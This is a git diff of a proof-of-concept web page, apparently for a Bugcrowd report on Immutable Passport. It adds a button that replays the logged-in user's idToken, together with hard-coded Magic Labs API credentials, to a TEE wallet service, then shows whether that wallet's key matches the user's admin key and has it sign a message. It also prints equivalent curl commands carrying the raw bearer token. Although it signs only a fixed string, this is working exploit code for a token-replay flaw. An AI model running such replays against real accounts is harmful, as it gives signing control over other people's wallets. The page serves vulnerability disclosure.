@@ -9,13 +9,16 @@
 <body>
 <h1>Passport PoC test dApp</h1>
 <p>Test account only: sucimaru@bugcrowdninja.com. Read-only address + idToken display. No funds, no transactions.</p>
-<p id="status">Build poc-dapp v3 · bundle 1054661 · Loading SDK…</p>
+<p id="status">Build poc-dapp v4 · bundle 1054661 · Loading SDK…</p>
 <button id="loginBtn" disabled>Login with Passport</button>
 <button id="infoBtn" disabled>Show getUserInfo + getIdToken</button>
 <h2>Result</h2>
 <pre id="out">(nothing yet)</pre>
 <h2>idToken (raw)</h2>
 <textarea id="idtoken" readonly placeholder="(empty)"></textarea>
+<button id="replayBtn" disabled>Run harmless TEE replay (signs keccak("bugcrowd-poc") only)</button>
+<h2>TEE replay result (harmless — fixed message, no funds, no transactions)</h2>
+<pre id="replayOut">(not run yet)</pre>
 
 <script src="./passport.bundle.js?v=3"></script>
 <script type="module">
@@ -31,11 +34,12 @@ const PUBLISHABLE_KEY = 'pk_imapik-kYX6I_KT0qee6aByVk7G';
 const ENVIRONMENT = 'PRODUCTION';
 const REDIRECT_URI = 'https://sucimaru.github.io/immutable-poc-test-dapp/';
 
-const BUILD = 'poc-dapp v3 · bundle 1054661 · config-included';
+const BUILD = 'poc-dapp v4 · bundle 1054661 · config-included';
 const out = document.getElementById('out');
 const statusEl = document.getElementById('status');
 const loginBtn = document.getElementById('loginBtn');
 const infoBtn = document.getElementById('infoBtn');
+const replayBtn = document.getElementById('replayBtn');
 function show(x) { out.textContent = typeof x === 'string' ? x : JSON.stringify(x, null, 2); }
 window.addEventListener('error', (e) => { statusEl.textContent = 'Page error [' + BUILD + ']: ' + (e.message || e.type); show(String(e.filename || '') + ':' + (e.lineno || '') + ' ' + (e.message || e)); });
 window.addEventListener('unhandledrejection', (e) => { statusEl.textContent = 'Unhandled rejection [' + BUILD + ']: ' + (e.reason && e.reason.message ? e.reason.message : e.reason); show(String(e.reason && e.reason.stack ? e.reason.stack : e.reason)); });
@@ -59,6 +63,7 @@ try {
   statusEl.textContent = 'SDK ready. ' + BUILD + '. Environment: ' + ENVIRONMENT;
   loginBtn.disabled = false;
   infoBtn.disabled = false;
+  replayBtn.disabled = false;
 } catch (e) {
   statusEl.textContent = 'SDK init FAILED: ' + (e && e.message ? e.message : e);
   show(String(e && e.stack ? e.stack : e));
@@ -78,6 +83,69 @@ infoBtn.onclick = async () => {
   } catch (e) {
     statusEl.textContent = 'getUserInfo/getIdToken FAILED: ' + (e && e.message ? e.message : e);
     show(String(e && e.stack ? e.stack : e));
+  }
+};
+
+// ---- Harmless TEE replay (triage fast-path) ----
+// Signs ONLY the fixed string "bugcrowd-poc" (digest below) with the
+// LOGGED-IN user's own key. No funds, no transactions, no meta-tx.
+// If in-browser fetch is blocked (CORS), show the equivalent curl instead.
+const TEE_BASE = 'https://tee.express.magiclabs.com';
+const TEE_API_KEY = 'pk_live_10F423798A540ED7';
+const TEE_PROVIDER_ID = 'aa80b860-8869-4f13-9000-6a6ad3d20017';
+const POC_DIGEST = '0x081e1ee66aaca11d1e9dd1ec3ca19d70701430d2f3e8512c8f1957ce21f7727f'; // keccak256("bugcrowd-poc")
+const replayOut = document.getElementById('replayOut');
+function replayShow(x) { replayOut.textContent = typeof x === 'string' ? x : JSON.stringify(x, null, 2); }
+replayBtn.onclick = async () => {
+  try {
+    statusEl.textContent = 'TEE replay running…';
+    replayShow('Running…');
+    const idToken = await passport.getIdToken();
+    if (!idToken) throw new Error('getIdToken() returned empty — log in first.');
+    const user = await passport.getUserInfo();
+    const admin = user && user.passport && user.passport.zkevm_user_admin_address;
+    const wallet = user && user.passport && user.passport.zkevm_eth_address;
+    const headers = { 'Content-Type': 'application/json', Authorization: 'Bearer ' + idToken, 'X-Magic-Chain': 'ETH', 'X-Magic-API-Key': TEE_API_KEY, 'X-OIDC-Provider-ID': TEE_PROVIDER_ID };
+    const lines = [];
+    lines.push('admin (from idToken claim): ' + admin);
+    lines.push('wallet (from idToken claim): ' + wallet);
+    lines.push('digest keccak256("bugcrowd-poc") = ' + POC_DIGEST);
+    lines.push('message_base64 = ' + btoa(POC_DIGEST) + '   (base64 of the "0x<hex>" string, exactly as the SDK encodes it)');
+    const cwRes = await fetch(TEE_BASE + '/v1/wallet', { method: 'POST', headers, body: '{}' });
+    const cw = await cwRes.json().catch(() => ({}));
+    const teeAddr = (cw.public_address || (cw.data && cw.data.public_address) || cw.address || null);
+    lines.push('');
+    lines.push('[1] POST /v1/wallet -> HTTP ' + cwRes.status + ', public_address = ' + teeAddr);
+    lines.push(teeAddr && admin && String(teeAddr).toLowerCase() === String(admin).toLowerCase()
+      ? '*** MATCH: the TEE key IS the admin key ***'
+      : 'MISMATCH (or missing address) — see raw below.');
+    const sRes = await fetch(TEE_BASE + '/v1/wallet/sign/message', { method: 'POST', headers, body: JSON.stringify({ message_base64: btoa(POC_DIGEST) }) });
+    const sBody = await sRes.text();
+    let sig = null;
+    try { const j = JSON.parse(sBody); sig = j.signature || (j.data && j.data.signature) || null; } catch (e) { /* not JSON */ }
+    lines.push('');
+    lines.push('[2] POST /v1/wallet/sign/message -> HTTP ' + sRes.status);
+    lines.push('signature = ' + (sig || sBody.slice(0, 300)));
+    if (sig) {
+      lines.push('');
+      lines.push('Verify offline (node + ethers) — the TEE personal_signs the digest bytes:');
+      lines.push('  ethers.recoverAddress(ethers.hashMessage(ethers.getBytes("' + POC_DIGEST + '")), "' + sig + '")');
+      lines.push('  // Expected: ' + admin);
+    }
+    lines.push('');
+    lines.push('Raw createWallet body: ' + JSON.stringify(cw).slice(0, 300));
+    replayShow(lines.join('\n'));
+    statusEl.textContent = 'TEE replay done — see result below.';
+  } catch (e) {
+    let curl = 'In-browser fetch failed: ' + (e && e.message ? e.message : e) + '\nRun the same calls from a terminal instead:\n\n';
+    try {
+      const idToken = await passport.getIdToken();
+      curl += 'TOKEN="' + (idToken || '(empty — log in first)') + '"\n';
+      curl += 'curl -s -X POST ' + TEE_BASE + '/v1/wallet -H "Authorization: Bearer $TOKEN" -H "X-Magic-Chain: ETH" -H "X-Magic-API-Key: ' + TEE_API_KEY + '" -H "X-OIDC-Provider-ID: ' + TEE_PROVIDER_ID + '" -H "Content-Type: application/json" -d \'{}\'\n\n';
+      curl += 'curl -s -X POST ' + TEE_BASE + '/v1/wallet/sign/message -H "Authorization: Bearer $TOKEN" -H "X-Magic-Chain: ETH" -H "X-Magic-API-Key: ' + TEE_API_KEY + '" -H "X-OIDC-Provider-ID: ' + TEE_PROVIDER_ID + '" -H "Content-Type: application/json" -d \'{"message_base64":"' + btoa(POC_DIGEST) + '"}\'\n';
+    } catch (e2) { curl += '(could not read idToken: ' + (e2 && e2.message ? e2.message : e2) + ')'; }
+    replayShow(curl);
+    statusEl.textContent = 'TEE replay fetch failed — curl fallback shown below.';
   }
 };
 
